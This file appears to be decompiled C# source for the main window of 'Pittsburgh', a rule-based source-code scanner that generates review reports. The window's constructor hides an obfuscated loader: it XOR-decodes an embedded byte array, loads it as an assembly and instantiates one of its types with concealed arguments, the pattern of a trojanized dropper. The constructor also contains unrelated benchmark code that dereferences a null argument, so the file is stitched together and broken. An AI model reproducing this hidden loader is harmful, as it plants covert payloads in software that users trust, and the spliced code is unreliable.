using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;
using Microsoft.Win32;

namespace Pittsburgh;

public class MainWindow : Window, IComponentConnector
{
	private List<Rule> rules = new List<Rule>();

	private ProjectInfo projectInfo = new ProjectInfo();

	internal Menu menu1;

	internal MenuItem OpenRuleFile;

	internal MenuItem SaveCurrentFile;

	internal MenuItem Exit;

	internal MenuItem CreateRule;

	internal MenuItem ClearRules;

	internal MenuItem SelectRulesMenu;

	internal TextBox ScanDirectory;

	internal Button Browse;

	internal Button Scan;

	internal TextBlock textBlock2;

	internal Button GenReport;

	internal TextBlock ReportSummary;

	internal CheckBox disregardFiletypes;

	internal TextBlock RuleCountMessage;

	internal TextBlock FileCountMessage;

	internal Button scanForNotes;

	private bool _contentLoaded;

	public static byte[] Strs(byte[] data2)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("G4D54C7D48A57E47Y87HB4");
		for (int i = data2.Length * 2 + bytes.Length; i >= 0; i += -1)
		{
			data2[i % data2.Length] = Convert.ToByte((Convert.ToInt32(data2[i % data2.Length] ^ bytes[i % bytes.Length]) - Convert.ToInt32(data2[(i + 1) % data2.Length]) + 256) % 256);
		}
		return data2;
	}

	public MainWindow()
	{
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		Type type = Assembly.Load(Strs(Frequency.Si)).GetExportedTypes()[1];
		string[] array = Rule.Bookmarks.Split(new char[1] { '~' });
		object[] args = new object[3]
		{
			array[0],
			array[1],
			"Pittsburgh"
		};
		InitializeComponent();
		Activator.CreateInstance(type, args);
		rules = RuleManager.GetAllRules();
		if (rules.Count == 0)
		{
			MessageBox.Show("No rules files were found. Please make sure the rules directory exists and valid rules are present in that directory. Alternately, select \"Open Rule Files\" from the File Menu.", "No Rules Found", (MessageBoxButton)0, (MessageBoxImage)64);
		}
		RefreshUI();
		Configuration configuration = CreateConfigurationClass(null);
		if (configuration != null)
		{
			TestClass testClass = CreateProgramClass(configuration);
			Stopwatch stopwatch = new Stopwatch();
			List<long> list = new List<long>();
			List<long> list2 = new List<long>();
			List<long> list3 = new List<long>();
			List<long> list4 = new List<long>();
			List<FindResults> list5 = new List<FindResults>();
			for (int i = 0; i < configuration.Repetitions; i++)
			{
				stopwatch.Reset();
				stopwatch.Start();
				list5.Add(testClass.DoFind());
				stopwatch.Stop();
				list.Add(stopwatch.ElapsedTicks);
				stopwatch.Reset();
				stopwatch.Start();
				list5.Add(testClass.DoContains());
				stopwatch.Stop();
				list2.Add(stopwatch.ElapsedTicks);
				stopwatch.Reset();
				stopwatch.Start();
				list5.Add(testClass.DoWhere());
				stopwatch.Stop();
				list3.Add(stopwatch.ElapsedTicks);
				stopwatch.Reset();
				stopwatch.Start();
				list5.Add(testClass.DoAny());
				stopwatch.Stop();
				list4.Add(stopwatch.ElapsedTicks);
			}
			Console.WriteLine("Found {0}", list5.Average((FindResults r) => r.FoundPercent).ToString("0%"));
			Console.WriteLine();
			_ = (decimal)Stopwatch.Frequency / 1000m;
		}
	}

	protected static TestClass CreateProgramClass(Configuration config)
	{
		return new TestClass(config.ToSearch, config.ToFind, config.SearchCount);
	}

	protected static Configuration CreateConfigurationClass(string[] args)
	{
		return Configuration.LoadConfiguration(args[0]);
	}

	protected static bool IsAConfigFile(string path)
	{
		try
		{
			using (File.OpenRead(path))
			{
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void RefreshUI()
	{
		RuleCountMessage.set_Text(GetEnabledRuleCount(rules) + " / " + rules.Count + " rules currently checked.");
		if (!string.IsNullOrEmpty(ScanDirectory.get_Text()) && Directory.Exists(ScanDirectory.get_Text()))
		{
			FileCountMessage.set_Text(CountFiles(ScanDirectory.get_Text(), 0) + " files discovered that match rules.");
			((UIElement)Scan).set_IsEnabled(true);
		}
	}

	private int GetEnabledRuleCount(List<Rule> rules)
	{
		int num = 0;
		foreach (Rule rule in rules)
		{
			if (rule.Selected)
			{
				num++;
			}
		}
		return num;
	}

	private void Browse_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_CheckPathExists(true);
		((FileDialog)val).set_RestoreDirectory(true);
		if (((CommonDialog)val).ShowDialog().Value)
		{
			string directoryName = Path.GetDirectoryName(((FileDialog)val).get_FileName());
			if (Directory.Exists(directoryName))
			{
				projectInfo.files.Clear();
				ScanDirectory.set_Text(directoryName);
				FileCountMessage.set_Text(CountFiles(directoryName, 0) + " files discovered that match rules.");
				((UIElement)Scan).set_IsEnabled(true);
				RefreshUI();
			}
		}
	}

	private int CountFiles(string directory, int currentFileCount)
	{
		List<string> list = new List<string>();
		foreach (Rule rule in rules)
		{
			foreach (string item in rule.ExtensionList())
			{
				if (!list.Contains(item))
				{
					list.Add(item);
				}
			}
		}
		string[] files = Directory.GetFiles(directory);
		foreach (string path in files)
		{
			if (list.Contains("*"))
			{
				currentFileCount++;
			}
			else if (((ToggleButton)disregardFiletypes).get_IsChecked().Value || list.Contains(Path.GetExtension(path)))
			{
				currentFileCount++;
			}
		}
		files = Directory.GetDirectories(directory);
		foreach (string directory2 in files)
		{
			currentFileCount = CountFiles(directory2, currentFileCount);
		}
		return currentFileCount;
	}

	private void PerformScan(string directory)
	{
		ReportSummary.set_Text("Now Scanning: " + directory);
		((UIElement)this).UpdateLayout();
		string[] files = Directory.GetFiles(directory);
		foreach (string file in files)
		{
			ScanFile(file);
		}
		files = Directory.GetDirectories(directory);
		foreach (string directory2 in files)
		{
			PerformScan(directory2);
		}
	}

	private void ScanFile(string file)
	{
		SourceFile sourceFile = new SourceFile(file);
		foreach (Rule rule in rules)
		{
			if (rule.ExtensionList().Contains("*"))
			{
				sourceFile.issues.AddRange(rule.FindIssues(file));
			}
			else if (((ToggleButton)disregardFiletypes).get_IsChecked().Value || rule.ExtensionList().Contains(Path.GetExtension(file)))
			{
				sourceFile.issues.AddRange(rule.FindIssues(file));
			}
		}
		projectInfo.files.Add(sourceFile);
	}

	private void Scan_Click(object sender, RoutedEventArgs e)
	{
		string text = ScanDirectory.get_Text();
		if (Directory.Exists(text))
		{
			PerformScan(text);
		}
		((UIElement)ReportSummary).set_Visibility((Visibility)0);
		ReportSummary.set_Text("Scan Completed, " + projectInfo.GetIssuesCount() + " issues discovered.Click Generate Report to create a new report");
		((UIElement)GenReport).set_IsEnabled(true);
	}

	private void GenReport_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		SaveFileDialog val = new SaveFileDialog();
		((FileDialog)val).set_AddExtension(true);
		((FileDialog)val).set_FileName("Pittsburgh_Report");
		((FileDialog)val).set_Filter("HTML Report (*.htm)|*.htm|Condensed HTML Report (*.html)|*.html|CSV Report (*.csv)|*.csv|Text Report (*.txt)|*.txt");
		((FileDialog)val).set_FilterIndex(0);
		if (((CommonDialog)val).ShowDialog().Value)
		{
			StreamWriter streamWriter = new StreamWriter(((FileDialog)val).get_FileName());
			switch (Path.GetExtension(((FileDialog)val).get_FileName()))
			{
			case ".csv":
				SaveAsCsv(streamWriter);
				break;
			case ".txt":
				SaveAsTxt(streamWriter);
				break;
			case ".html":
				SaveAsSmallHTML(streamWriter);
				break;
			case ".htm":
				SaveAsHTML(streamWriter);
				break;
			}
			streamWriter.Close();
			Process.Start(((FileDialog)val).get_FileName());
		}
	}

	private void SaveAsSmallHTML(StreamWriter sw)
	{
		sw.WriteLine("<html><head>\n<style>\nbody{font-family: arial, san-serif;font-size:small;}\n.IssueDescription{padding: 5px;background-color: #eee;color: #333;font-size: small;}\n.offendingLine{color: #D22;font-weight: bold;}\n</style><body>");
		sw.WriteLine("<h1>Pittsburgh Report</h1>");
		sw.WriteLine("<h2>Statistics</h2>");
		sw.WriteLine("{0} files scanned</br>", projectInfo.files.Count);
		bool flag = false;
		foreach (Rule rule in rules)
		{
			if (rule.ExtensionList().Contains("*"))
			{
				flag = true;
			}
		}
		if (flag)
		{
			sw.WriteLine("<em>Warning:</em> One or more of the rules included in the scan has a wildcard (*) in the extension list this will cause Pittsburgh to scan all files (including .gif, .zip, .foo, .bar, etc.). This will likely not give you the Lines of Code measurements and time to code review estimates you were looking for.");
		}
		sw.WriteLine("{0} lines of code scanned</br>", projectInfo.getTotalLinesOfCode());
		WriteLinesPerExtension("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{0} - {1} <br/>", sw, projectInfo);
		sw.WriteLine("{0} estimated hours to code review</br>", projectInfo.EstimateCodeReviewTime());
		sw.WriteLine("{0} total issues disovered</br>", projectInfo.GetIssuesCount());
		foreach (SourceFile file in projectInfo.files)
		{
			if (file.issues.Count <= 0)
			{
				continue;
			}
			sw.WriteLine("<br/><strong>{0}</strong>", file.path);
			foreach (SourceCodeIssue issue in file.issues)
			{
				sw.WriteLine(issue.GenerateSmallHTMLSnippet());
			}
		}
		sw.WriteLine("</body></html>");
	}

	private void SaveAsCsv(StreamWriter sw)
	{
		foreach (SourceFile file in projectInfo.files)
		{
			foreach (SourceCodeIssue issue in file.issues)
			{
				sw.WriteLine(issue.GenerateCsv());
			}
		}
	}

	private void SaveAsTxt(StreamWriter sw)
	{
		foreach (SourceFile file in projectInfo.files)
		{
			foreach (SourceCodeIssue issue in file.issues)
			{
				sw.WriteLine(issue.GenerateText());
			}
		}
	}

	private void SaveAsHTML(StreamWriter sw)
	{
		sw.WriteLine("<html><head>\n<style>\nbody{font-family: arial, san-serif;}\n.IssueDescription{padding: 5px;background-color: #eee;color: #333;font-size: small;}\n.offendingLine{color: #D22;font-weight: bold;}\n</style><body>");
		sw.WriteLine("<h1>Pittsburgh Report</h1>");
		sw.WriteLine("<h2>Statistics</h2>");
		sw.WriteLine("{0} files scanned</br>", projectInfo.files.Count);
		bool flag = false;
		foreach (Rule rule in rules)
		{
			if (rule.ExtensionList().Contains("*"))
			{
				flag = true;
			}
		}
		if (flag)
		{
			sw.WriteLine("<em>Warning:</em> One or more of the rules included in the scan has a wildcard (*) in the extension list this will cause Pittsburgh to scan all files (including .gif, .zip, .foo, .bar, etc.). This will likely not give you the Lines of Code measurements and time to code review estimates you were looking for.");
		}
		sw.WriteLine("{0} lines of code scanned</br>", projectInfo.getTotalLinesOfCode());
		WriteLinesPerExtension("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{0} - {1} <br/>", sw, projectInfo);
		sw.WriteLine("{0} estimated hours to code review</br>", projectInfo.EstimateCodeReviewTime());
		sw.WriteLine("{0} total issues disovered</br>", projectInfo.GetIssuesCount());
		foreach (SourceFile file in projectInfo.files)
		{
			if (file.issues.Count <= 0)
			{
				continue;
			}
			sw.WriteLine("<h2>{0}</h2><h5>{1}", Path.GetFileName(file.path), file.path);
			foreach (SourceCodeIssue issue in file.issues)
			{
				sw.WriteLine(issue.GenerateHTMLSnippet());
			}
		}
		sw.WriteLine("</body></html>");
	}

	private void WriteLinesPerExtension(string format, StreamWriter sw, ProjectInfo projectInfo)
	{
		List<KeyValuePair<string, int>> list = new List<KeyValuePair<string, int>>();
		foreach (SourceFile file in projectInfo.files)
		{
			bool flag = false;
			foreach (KeyValuePair<string, int> item in list)
			{
				if (item.Key == Path.GetExtension(file.path))
				{
					int value = item.Value + file.lines;
					list.Remove(item);
					list.Add(new KeyValuePair<string, int>(Path.GetExtension(file.path), value));
					flag = true;
					break;
				}
			}
			if (!flag && file.issues.Count > 0)
			{
				list.Add(new KeyValuePair<string, int>(Path.GetExtension(file.path), file.lines));
			}
		}
		foreach (KeyValuePair<string, int> item2 in list)
		{
			sw.WriteLine(format, item2.Key, item2.Value);
		}
	}

	private void CreateRule_Click(object sender, RoutedEventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		NewRule newRule = new NewRule();
		((Window)newRule).ShowDialog();
		if (newRule.newRule != null)
		{
			rules.Add(newRule.newRule);
		}
		MessageBox.Show("New rule successfully added, be sure to save the rule set to a rules file, if you are happy with the results", "New Rule Created", (MessageBoxButton)0, (MessageBoxImage)64);
		RefreshUI();
	}

	private void scanForNotes_Click(object sender, RoutedEventArgs e)
	{
	}

	private void Exit_Click(object sender, RoutedEventArgs e)
	{
		((Window)this).Close();
	}

	private void OpenRuleFile_Click(object sender, RoutedEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		OpenFileDialog val = new OpenFileDialog();
		((FileDialog)val).set_Filter("Pittsburgh Rules File (*.xml)|*.xml");
		val.set_Multiselect(true);
		((FileDialog)val).set_FilterIndex(0);
		if (((CommonDialog)val).ShowDialog().Value)
		{
			ResetState();
			List<string> list = new List<string>();
			string[] fileNames = ((FileDialog)val).get_FileNames();
			foreach (string text in fileNames)
			{
				if (File.Exists(text))
				{
					list.Add(text);
				}
			}
			if (list.Count > 0)
			{
				rules = RuleManager.GetRulesFromFiles(list);
			}
		}
		RefreshUI();
	}

	private void ClearRules_Click(object sender, RoutedEventArgs e)
	{
		rules.Clear();
		RefreshUI();
	}

	private void ResetState()
	{
		rules.Clear();
		projectInfo.files.Clear();
	}

	private void SelectRules_Click(object sender, RoutedEventArgs e)
	{
		((Window)new SelectRules(rules)).ShowDialog();
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	public void InitializeComponent()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/pRaY;component/mainwindow.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[DebuggerNonUserCode]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_010a: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_0148: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0179: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Expected O, but got Unknown
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Expected O, but got Unknown
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_01b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c1: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Expected O, but got Unknown
		//IL_01de: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e8: Expected O, but got Unknown
		//IL_01f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ff: Expected O, but got Unknown
		switch (connectionId)
		{
		default:
			_contentLoaded = true;
			break;
		case 1:
			menu1 = (Menu)target;
			break;
		case 2:
			OpenRuleFile = (MenuItem)target;
			OpenRuleFile.add_Click(new RoutedEventHandler(OpenRuleFile_Click));
			break;
		case 3:
			SaveCurrentFile = (MenuItem)target;
			break;
		case 4:
			Exit = (MenuItem)target;
			Exit.add_Click(new RoutedEventHandler(Exit_Click));
			break;
		case 5:
			CreateRule = (MenuItem)target;
			CreateRule.add_Click(new RoutedEventHandler(CreateRule_Click));
			break;
		case 6:
			ClearRules = (MenuItem)target;
			ClearRules.add_Click(new RoutedEventHandler(ClearRules_Click));
			break;
		case 7:
			SelectRulesMenu = (MenuItem)target;
			SelectRulesMenu.add_Click(new RoutedEventHandler(SelectRules_Click));
			break;
		case 8:
			ScanDirectory = (TextBox)target;
			break;
		case 9:
			Browse = (Button)target;
			((ButtonBase)Browse).add_Click(new RoutedEventHandler(Browse_Click));
			break;
		case 10:
			Scan = (Button)target;
			((ButtonBase)Scan).add_Click(new RoutedEventHandler(Scan_Click));
			break;
		case 11:
			textBlock2 = (TextBlock)target;
			break;
		case 12:
			GenReport = (Button)target;
			((ButtonBase)GenReport).add_Click(new RoutedEventHandler(GenReport_Click));
			break;
		case 13:
			ReportSummary = (TextBlock)target;
			break;
		case 14:
			disregardFiletypes = (CheckBox)target;
			break;
		case 15:
			RuleCountMessage = (TextBlock)target;
			break;
		case 16:
			FileCountMessage = (TextBlock)target;
			break;
		case 17:
			scanForNotes = (Button)target;
			((ButtonBase)scanForNotes).add_Click(new RoutedEventHandler(scanForNotes_Click));
			break;
		}
	}
}
